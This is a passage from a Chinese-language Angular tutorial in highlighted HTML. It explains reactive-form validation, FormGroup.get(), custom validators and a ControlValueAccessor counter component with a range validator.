         <span class="token operator">&lt;</span>label<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;radio&quot;</span> value<span class="token operator">=</span><span class="token string">&quot;1&quot;</span>
               formControlName<span class="token operator">=</span><span class="token string">&quot;enableMobile&quot;</span><span class="token operator">&gt;</span>
                 是
         <span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
         <span class="token operator">&lt;</span>label<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;radio&quot;</span> value<span class="token operator">=</span><span class="token string">&quot;0&quot;</span>
               formControlName<span class="token operator">=</span><span class="token string">&quot;enableMobile&quot;</span><span class="token operator">&gt;</span>
                 否
         <span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span><span class="token operator">/</span>div
<span class="token comment">//  tel 控件</span>
<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;form-group&quot;</span>
    <span class="token punctuation">[</span>ngClass<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;{'has-error': (mobile.touched || mobile.dirty) &amp;&amp; !mobile.valid }&quot;</span><span class="token operator">&gt;</span>
          <span class="token operator">&lt;</span>label <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;col-md-2 control-label&quot;</span>
                 <span class="token keyword">for</span><span class="token operator">=</span><span class="token string">&quot;mobileId&quot;</span><span class="token operator">&gt;</span>手机号码<span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>

          <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;col-md-8&quot;</span><span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>input <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;form-control&quot;</span>
                   id<span class="token operator">=</span><span class="token string">&quot;mobileId&quot;</span>
                   <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">&quot;text&quot;</span>
                   placeholder<span class="token operator">=</span><span class="token string">&quot;请输入手机号码&quot;</span>
                   formControlName<span class="token operator">=</span><span class="token string">&quot;mobile&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;help-block&quot;</span> <span class="token operator">*</span>ngIf<span class="token operator">=</span>&quot;<span class="token punctuation">(</span>mobile<span class="token punctuation">.</span>touched <span class="token operator">||</span> mobile<span class="token punctuation">.</span>dirty<span class="token punctuation">)</span> 
               <span class="token operator">&amp;&amp;</span> mobile<span class="token punctuation">.</span>errors&quot;<span class="token operator">&gt;</span>
                  <span class="token operator">&lt;</span>span <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;mobile.errors.required&quot;</span><span class="token operator">&gt;</span>
                     请输入手机号码
                  <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
                  <span class="token operator">&lt;</span>span <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;mobile.errors.minlength&quot;</span><span class="token operator">&gt;</span>
                     手机号码格式不正确
                  <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
          <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token comment">// 动态调整验证规则功能</span>
<span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token operator">...</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>signupForm<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'enableMobile'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>valueChanges
      <span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkMobile</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">checkMobile</span><span class="token punctuation">(</span>enableMobile<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> mobileControl <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>signupForm<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'mobile'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  enableMobile <span class="token operator">===</span> <span class="token string">&quot;1&quot;</span> <span class="token operator">?</span> 
      mobileControl<span class="token punctuation">.</span><span class="token function">setValidators</span><span class="token punctuation">(</span><span class="token punctuation">[</span>Validators<span class="token punctuation">.</span>required<span class="token punctuation">,</span>
        Validators<span class="token punctuation">.</span><span class="token function">pattern</span><span class="token punctuation">(</span><span class="token string">'1(3|4|5|7|8)\\d{9}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">:</span>
      mobileControl<span class="token punctuation">.</span><span class="token function">clearValidators</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    mobileControl<span class="token punctuation">.</span><span class="token function">updateValueAndValidity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br></div></div><h3 id="获取from控件"><a href="#获取from控件" class="header-anchor">#</a> 获取from控件</h3> <p>FormGroup 对象 (FormGroup 类继承于AbstractControl)，提供的 get() 方法，可以获取指定的表单控件。get() 方法的签名如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">get</span><span class="token punctuation">(</span>path<span class="token operator">:</span> Array<span class="token operator">&lt;</span>string<span class="token operator">|</span>number<span class="token operator">&gt;</span><span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token operator">:</span> AbstractControl <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">_find</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token comment">// 使用示例 - 获取sub-group的表单控件</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'person.name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token operator">-</span><span class="token constant">OR</span><span class="token operator">-</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>form<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'person'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="自定义验证器"><a href="#自定义验证器" class="header-anchor">#</a> 自定义验证器</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">myCustomValidator</span><span class="token punctuation">(</span><span class="token parameter">c<span class="token operator">:</span> AbstractControl</span><span class="token punctuation">)</span><span class="token operator">:</span> 
  <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> boolean<span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>somethingIsWrong<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span> <span class="token string">'myvalidator'</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//支持参数</span>
<span class="token keyword">function</span> <span class="token function">myCustomValidator</span><span class="token punctuation">(</span><span class="token parameter">param<span class="token operator">:</span> any</span><span class="token punctuation">)</span><span class="token operator">:</span> ValidatorFn <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>c<span class="token operator">:</span> AbstractControl<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> boolean<span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>somethingIsWrong<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token punctuation">{</span> <span class="token string">'myvalidator'</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
      <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 注册自定义验证器</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">EXE_COUNTER_VALIDATOR</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    provide<span class="token operator">:</span> <span class="token constant">NG_VALIDATORS</span><span class="token punctuation">,</span>
    useValue<span class="token operator">:</span> validateCounterRange<span class="token punctuation">,</span>
    multi<span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h3 id="自定义表单控件"><a href="#自定义表单控件" class="header-anchor">#</a> 自定义表单控件</h3> <p>自定义类似angular内置表单组件或第三方表单组件如ng-zorro使用formControlName就能够自动收集表单参数数据的控件，本质遵从angular的接口方式实现<code>[()]</code>双向绑定，同时记住，所有支持双向绑定表单都支持ngModelChange监听控件参数的变化，至于增加表单控件规则自动化验证则需要遵循实现验证器的接口，具体是看下面完整的自定义验证组件。</p> <ol><li>实现ControlValueAccessor</li> <li>注册NG_VALUE_ACCESSOR</li></ol> <p>ControlValueAccessor 是一个接口，它的作用是：</p> <ul><li>把 form 模型中值映射到视图中</li> <li>当视图发生变化时，通知 form directives 或 form controls</li></ul> <p>Angular 中常见的 ControlValueAccessor 有：</p> <ul><li>DefaultValueAccessor - 用于 text 和 textarea 类型的输入控件</li> <li>SelectControlValueAccessor - 用于 select 选择控件</li> <li>CheckboxControlValueAccessor - 用于 checkbox 复选控件</li></ul> <p>ControlValueAccessor 接口</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/forms/src/directives/control_value_accessor.ts </span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">ControlValueAccessor</span> <span class="token punctuation">{</span>
  <span class="token function">writeValue</span><span class="token punctuation">(</span>obj<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token function">registerOnChange</span><span class="token punctuation">(</span>fn<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token function">registerOnTouched</span><span class="token punctuation">(</span>fn<span class="token operator">:</span> any<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  setDisabledState<span class="token operator">?</span><span class="token punctuation">(</span>isDisabled<span class="token operator">:</span> boolean<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><ul><li>writeValue(obj: any)：该方法用于将模型中的新值写入视图或 DOM 属性中。</li> <li>registerOnChange(fn: any)：设置当控件接收到 change 事件后，调用的函数</li> <li>registerOnTouched(fn: any)：设置当控件接收到 touched 事件后，调用的函数</li> <li>setDisabledState?(isDisabled: boolean)：当控件状态变成 DISABLED 或从 DISABLED 状态变化成 ENABLE 状态时，会调用该函数。该函数会根据参数值，启用或禁用指定的 DOM 元素。</li></ul> <p>实现样例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> forwardRef <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ControlValueAccessor<span class="token punctuation">,</span> <span class="token constant">NG_VALUE_ACCESSOR</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/forms'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">EXE_COUNTER_VALUE_ACCESSOR</span><span class="token operator">:</span> any <span class="token operator">=</span> <span class="token punctuation">{</span>
    provide<span class="token operator">:</span> <span class="token constant">NG_VALUE_ACCESSOR</span><span class="token punctuation">,</span>
    useExisting<span class="token operator">:</span> <span class="token function">forwardRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> CounterComponent<span class="token punctuation">)</span><span class="token punctuation">,</span>
    multi<span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-counter'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div&gt;
      &lt;p&gt;当前值: {{ count }}&lt;/p&gt;
      &lt;button (click)=&quot;increment()&quot;&gt; + &lt;/button&gt;
      &lt;button (click)=&quot;decrement()&quot;&gt; - &lt;/button&gt;
    &lt;/div&gt;
    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
    providers<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token constant">EXE_COUNTER_VALUE_ACCESSOR</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CounterComponent</span> <span class="token keyword">implements</span> <span class="token class-name">ControlValueAccessor</span> <span class="token punctuation">{</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> _count<span class="token operator">:</span> number <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">get</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_count<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">set</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>_count <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">propagateChange</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_count<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function-variable function">propagateChange</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">_<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">writeValue</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">registerOnChange</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>propagateChange <span class="token operator">=</span> fn<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">registerOnTouched</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
    <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">decrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><h3 id="自定义验证组件"><a href="#自定义验证组件" class="header-anchor">#</a> 自定义验证组件</h3> <p>我们自定义 CounterComponent 组件的预期使用方式和封装如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 预期使用</span>
<span class="token operator">&lt;</span>exe<span class="token operator">-</span>counter
  formControlName<span class="token operator">=</span><span class="token string">&quot;counter&quot;</span>
  counterRangeMax<span class="token operator">=</span><span class="token string">&quot;10&quot;</span>
  counterRangeMin<span class="token operator">=</span><span class="token string">&quot;0&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>exe<span class="token operator">-</span>counter<span class="token operator">&gt;</span>

<span class="token comment">// 封装</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> OnChanges<span class="token punctuation">,</span> SimpleChanges<span class="token punctuation">,</span> forwardRef <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>
    ControlValueAccessor<span class="token punctuation">,</span> <span class="token constant">NG_VALUE_ACCESSOR</span><span class="token punctuation">,</span> <span class="token constant">NG_VALIDATORS</span><span class="token punctuation">,</span> Validator<span class="token punctuation">,</span>
    AbstractControl<span class="token punctuation">,</span> ValidatorFn<span class="token punctuation">,</span> ValidationErrors<span class="token punctuation">,</span> FormControl
<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/forms'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">EXE_COUNTER_VALIDATOR</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    provide<span class="token operator">:</span> <span class="token constant">NG_VALIDATORS</span><span class="token punctuation">,</span>
    useExisting<span class="token operator">:</span> <span class="token function">forwardRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> CounterComponent<span class="token punctuation">)</span><span class="token punctuation">,</span>
    multi<span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">createCounterRangeValidator</span><span class="token punctuation">(</span><span class="token parameter">maxValue<span class="token operator">:</span> number<span class="token punctuation">,</span> minValue<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>control<span class="token operator">:</span> AbstractControl<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter">ValidationErrors</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>control<span class="token punctuation">.</span>value <span class="token operator">&gt;</span> <span class="token operator">+</span>maxValue <span class="token operator">||</span> control<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> <span class="token operator">+</span>minValue<span class="token punctuation">)</span> <span class="token operator">?</span>
            <span class="token punctuation">{</span> <span class="token string">'rangeError'</span><span class="token operator">:</span> <span class="token punctuation">{</span> current<span class="token operator">:</span> control<span class="token punctuation">.</span>value<span class="token punctuation">,</span> max<span class="token operator">:</span> maxValue<span class="token punctuation">,</span> min<span class="token operator">:</span> minValue <span class="token punctuation">}</span> <span class="token punctuation">}</span> 
              <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-counter'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div&gt;
      &lt;p&gt;当前值: {{ count }}&lt;/p&gt;
      &lt;button (click)=&quot;increment()&quot;&gt; + &lt;/button&gt;
      &lt;button (click)=&quot;decrement()&quot;&gt; - &lt;/button&gt;
    &lt;/div&gt;
    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
    providers<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token constant">EXE_COUNTER_VALUE_ACCESSOR</span><span class="token punctuation">,</span> <span class="token constant">EXE_COUNTER_VALIDATOR</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CounterComponent</span> <span class="token keyword">implements</span> <span class="token class-name">ControlValueAccessor</span><span class="token punctuation">,</span> Validator<span class="token punctuation">,</span>
    OnChanges <span class="token punctuation">{</span>
    <span class="token keyword">private</span> _validator<span class="token operator">:</span> ValidatorFn<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token function-variable function">_onChange</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> counterRangeMin<span class="token operator">:</span> number<span class="token punctuation">;</span> <span class="token comment">// 设置数据有效范围的最大值</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> counterRangeMax<span class="token operator">:</span> number<span class="token punctuation">;</span> <span class="token comment">// 设置数据有效范围的最小值</span>
    <span class="token comment">// 监听输入属性变化，调用内部的_createValidator()方法，创建RangeValidator</span>
    <span class="token function">ngOnChanges</span><span class="token punctuation">(</span>changes<span class="token operator">:</span> SimpleChanges<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'counterRangeMin'</span> <span class="token keyword">in</span> changes <span class="token operator">||</span> <span class="token string">'counterRangeMax'</span> <span class="token keyword">in</span> changes<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_createValidator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 动态创建RangeValidator</span>
    <span class="token keyword">private</span> <span class="token function">_createValidator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>_validator <span class="token operator">=</span> <span class="token function">createCounterRangeValidator</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>counterRangeMax<span class="token punctuation">,</span>
           <span class="token keyword">this</span><span class="token punctuation">.</span>counterRangeMin<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 执行控件验证</span>
    <span class="token function">validate</span><span class="token punctuation">(</span>c<span class="token operator">:</span> AbstractControl<span class="token punctuation">)</span><span class="token operator">:</span> ValidationErrors <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>counterRangeMin <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>counterRangeMax <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> 
            <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_validator</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span 